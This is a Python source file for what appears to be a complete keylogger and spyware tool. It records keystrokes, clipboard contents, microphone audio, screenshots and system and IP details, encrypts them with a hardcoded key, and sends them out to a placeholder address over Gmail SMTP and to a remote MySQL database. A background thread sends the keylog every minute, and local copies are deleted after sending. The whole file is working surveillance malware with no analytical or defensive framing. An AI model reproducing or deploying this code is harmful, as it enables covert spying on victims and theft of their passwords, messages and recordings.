from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import mysql.connector
import smtplib
import win32clipboard
import socket
import platform
import getpass
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from PIL import ImageGrab
from requests import get
from cryptography.fernet import Fernet
from datetime import datetime
from multiprocessing import process, freeze_support
import threading

# File names for storing logs and data
keys_information = "key_log.txt"
system_information = "systminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

# Encrypted file names
keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

# Email credentials (provide your email address and password here)
email_address = "your_email@gmail.com"
password = "your_email_password"
toaddr = "recipient_email@gmail.com"

# Database credentials (provide your MySQL database credentials here)
db_host = "your_db_host"
db_user = "your_db_username"
db_password = "your_db_password"
db_database = "your_db_name"

# Recording and iteration settings
microphone_time = 10  # Duration for microphone recording
time_iteration = 15   # Time interval for iterations
number_of_iterations_end = 3  # Number of iterations
username = getpass.getuser()  # Get the username of the current user

# File path setup
file_path = os.path.abspath(os.path.dirname(__file__))
extend = "\\"
file_merge = os.path.join(file_path, extend)
os.makedirs(file_merge, exist_ok=True)  # Create directory if it does not exist

# Encryption key and cipher suite setup
encryption_key = 'LDtGBp9DMpHh7CROYmkhaEx5Dt9VhW-dVijLS4oBmrw='
cipher_suite = Fernet(encryption_key)

# Establish MySQL connection
connection = mysql.connector.connect(
    host=db_host,
    user=db_user,
    password=db_password,
    database=db_database
)

# Check if the connection is successful
if connection.is_connected():
    print("Connected to MySQL!")
    cursor = connection.cursor()

# Function to store file data in MySQL
def store_in_mysql(filename):
    with open(os.path.join(file_path, filename), 'rb') as f:
        data = f.read()

    encrypted_data = cipher_suite.encrypt(data)  # Encrypt data
    current_datetime = datetime.now()

    # Prepend timestamp to the filename
    timestamp = current_datetime.strftime("%Y%m%d_%H%M%S")
    filename_with_timestamp = f"{timestamp}_{filename}"

    insert_query = "INSERT INTO files (filename, file_data, upload_date, upload_time) VALUES (%s, %s, %s, %s)"
    try:
        cursor.execute(insert_query, (filename_with_timestamp, encrypted_data, current_datetime.date(), current_datetime.time()))
        connection.commit()
        print(f"File '{filename}' successfully stored in the database with timestamp {timestamp}.")
    except mysql.connector.Error as err:
        print(f"Error storing file '{filename}' in the database:", err)

# Function to send email with attachment
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg["To"] = toaddr
    msg['Subject'] = "Log File"
    body = "body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))

    attachment_path = os.path.join(file_path, attachment)

    with open(attachment_path, 'rb') as f:
        attachment_data = f.read()

    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment_data)
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', f'attachment; filename={filename}')

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)

    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)

    # Close SMTP connection
    s.quit()

# Function to encrypt a file
def encrypt_file(file_path):
    with open(file_path, 'rb') as f:
        data = f.read()
    encrypted_data = cipher_suite.encrypt(data)
    encrypted_file_path = file_path + '.encrypted'
    with open(encrypted_file_path, 'wb') as f:
        f.write(encrypted_data)
    return encrypted_file_path

# Encrypt and send email with encrypted attachment
def send_encrypted_email(filename, toaddr):
    encrypted_attachment_path = encrypt_file(filename)
    send_email(filename + '.encrypted', encrypted_attachment_path, toaddr)
    os.remove(encrypted_attachment_path)  # Remove the encrypted file after sending
    os.remove(filename)  # Remove the unencrypted file after sending

# Function to gather and log system information
def computer_information():
    with open(os.path.join(file_path, system_information), "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("public IP Address: " + public_ip + "\n")
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)\n")

        f.write("Processor: " + platform.processor() + "\n")
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

# Gather and send system information
computer_information()
store_in_mysql(system_information)
send_encrypted_email(system_information, toaddr)

# Function to copy clipboard data
def copy_clipboard():
    with open(os.path.join(file_path, clipboard_information), "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data + "\n")

        except:
            f.write("Clipboard could not be copied\n")

# Gather and send clipboard information
copy_clipboard()
store_in_mysql(clipboard_information)
send_encrypted_email(clipboard_information, toaddr)

# Function to record audio
def microphone():
    fs = 44100  # Sample rate
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()  # Wait until recording is finished

    write(os.path.join(file_path, audio_information), fs, myrecording)  # Save as WAV file

# Record and send audio information
microphone()
store_in_mysql(audio_information)
send_encrypted_email(audio_information, toaddr)

# Function to capture a screenshot
def screenshot():
    im = ImageGrab.grab()
    im.save(os.path.join(file_path, screenshot_information))

# Capture and send screenshot information
screenshot()
store_in_mysql(screenshot_information)
send_encrypted_email(screenshot_information, toaddr)

# Function to periodically send keys information via email
def send_keys_information_periodically():
    while True:
        store_in_mysql(keys_information)
        send_encrypted_email(keys_information, toaddr)
        time.sleep(60)  # Send every 60 seconds

# Start the thread to send keys information periodically
keys_info_thread = threading.Thread(target=send_keys_information_periodically)
keys_info_thread.daemon = True  # Daemonize the thread to exit when the main thread exits
keys_info_thread.start()

# Check if the key_log.txt file exists, and create it if it doesn't
if not os.path.exists(os.path.join(file_path, keys_information)):
    with open(os.path.join(file_path, keys_information), 'w'):
        pass  # Create an empty file

# Main loop to log keystrokes and send data periodically
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:
    count = 0
    keys = []

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        keys_information = "key_log.txt"

        # Check if the file exists, and create it if it doesn't
        if not os.path.exists(os.path.join(file_path, keys_information)):
            with open(os.path.join(file_path, keys_information), 'w') as f:
                pass

        with open(os.path.join(file_path, keys_information), "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                elif k.find("key") == -1:
                    f.write(k)

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        with open(os.path.join(file_path, keys_information), "w") as f:
            f.write(" ")
        screenshot()
        send_encrypted_email(screenshot_information, toaddr)

        copy_clipboard()

        number_of_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

# Files to encrypt and send
files_to_encrypt = [os.path.join(file_merge, system_information), os.path.join(file_merge, clipboard_information), os.path.join(file_merge, keys_information)]
encrypted_file_names = [os.path.join(file_merge, system_information_e), os.path.join(file_merge, clipboard_information_e), os.path.join(file_merge, keys_information_e)]

count = 0

for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(encryption_key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_encrypted_email(encrypted_file_names[count], toaddr)
    count += 1

# Sleep for 120 seconds before ending
time.sleep(120)
